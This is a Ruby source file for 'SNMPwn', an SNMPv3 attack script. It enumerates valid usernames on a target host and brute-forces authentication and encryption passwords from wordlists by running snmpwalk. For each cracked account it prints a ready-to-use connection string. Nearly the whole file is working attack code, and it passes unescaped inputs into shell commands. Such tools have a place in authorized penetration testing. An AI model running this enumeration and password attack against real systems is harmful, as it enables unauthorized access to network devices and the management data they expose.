#!/usr/bin/env ruby
#SNMPwn
#SNMPv3 User Enumeration and Password Attack Script

require 'tty-command'
require 'trollop'
require 'colorize'
require 'logger'

def arguments

  opts = Trollop::options do 
    version "snmpwn v0.95b".light_blue
    banner <<-EOS
    snmpwn v0.95b
      EOS

        opt :host, "SNMPv3 Server IP", :type => String #change to accept lists of hosts too
        opt :enum_users, "Emumerate SNMPv3 Users?" #may remove, not currently using
        opt :users, "List of users you want to try", :type => String
        opt :user, "Specify a single user to try", :type => String #probably remove this in favour of a list
        opt :auth, "SNMP Authentication and Encryption Type. Should be either: authnopriv, noauthnopriv or authpriv", :type => String
        opt :passlist, "Password list for attacks", :type => String
        opt :enclist, "Encryption Password List for AuthPriv types", :type => String

        if ARGV.empty?
          puts "Need Help? Try ./snmpwn --help".red.bold
        exit
      end
    end
  opts
end

def findusers(arg)
  users = []
  userfile = File.readlines(arg[:users]).map(&:chomp)
  cmd = TTY::Command.new(printer: :null)
  
  puts "Enumerating SNMPv3 users".light_blue.bold
  userfile.each do |user|
    out, err = cmd.run!("snmpwalk -u #{user} #{arg[:host]} iso.3.6.1.2.1.1.1.0")
      if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
        puts "Username: #{user} is valid".green.bold
        users << user
      elsif err =~ /authorizationError/i
        puts "Username: #{user} is valid".green.bold
        users << user
      elsif err =~ /snmpwalk: Unknown user name/i
        puts "Username: #{user} is not configured on this host".red.bold
    end
  end
  puts "\nValid Users:".green.bold + "\n#{users.join("\n")}"
  users
end

def attack(arg, users)
  passwords = File.readlines(arg[:passlist]).map(&:chomp)
  encryption_pass = File.readlines(arg[:enclist]).map(&:chomp)
  cmd = TTY::Command.new(printer: :null)
  # cmd = TTY::Command.new

  puts "\nTesting SNMPv3 without authentication and encryption".light_blue.bold
  users.each do |user|   
    out, err = cmd.run!("snmpwalk -u #{user} #{arg[:host]} iso.3.6.1.2.1.1.1.0")
      if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
        users.delete(user)
        puts "#{user} can connect without a password".green.bold
        puts "To connect for a POC, use this string:\nsnmpwalk -u #{user} #{arg[:host]}".light_magenta
  end
end

  puts "\nTesting SNMPv3 with authentication and without encryption".light_blue.bold
  users.each do |user|
    passwords.each do |password|
      if password.length >= 8
      out, err = cmd.run!("snmpwalk -u #{user} -A #{password} #{arg[:host]} -v3 iso.3.6.1.2.1.1.1.0 -l authnopriv")
        if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
          users.delete(user)
          puts "#{user} can connect with the password #{password}".green.bold
          puts "To connect for a POC, use this string:\nsnmpwalk -u #{user} -A #{password} #{arg[:host]} -v3 -l authnopriv".light_magenta
        end
      end
    end
  end

  puts "\nTesting SNMPv3 with authentication and encryption".light_blue.bold
  users.each do |user|
    passwords.each do |password|
      encryption_pass.each do |epass|
        if epass.length >= 8 && password.length >= 8
        out, err = cmd.run!("snmpwalk -u #{user} -A #{password} -X #{epass} #{arg[:host]} -v3 iso.3.6.1.2.1.1.1.0 -l authpriv", timeout: 0.5)
          if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
            users.delete(user)
            puts "#{user} can connect with the password #{password} and the encryption password #{epass} ".green.bold
            puts "To connect for a POC, use this string:\nsnmpwalk -u #{user} -A #{password} -X #{epass} #{arg[:host]} -v3 -l authpriv".light_magenta
          else
            puts "#{user} cannot connect with the password #{password} and the encryption password #{epass} ".red.bold
          end
        end
      end
    end
  end
end

arg = arguments
users = findusers(arg)
attack(arg, users)




#Commands:
#No auth just username
#snmpwalk -u user1 192.168.1.107 -v3 iso.3.6.1.2.1.1.1.0
#Authentication and encryption
#snmpwalk -u user2 -A password 192.168.1.107 -X password -v3 iso.3.6.1.2.1.1.1.0 -l authpriv
#Same again but this user was configured for RW - Is there a way to enumerate that?
#snmpwalk -u user3 -A password 192.168.1.107 -X password -v3 iso.3.6.1.2.1.1.1.0 -l authPriv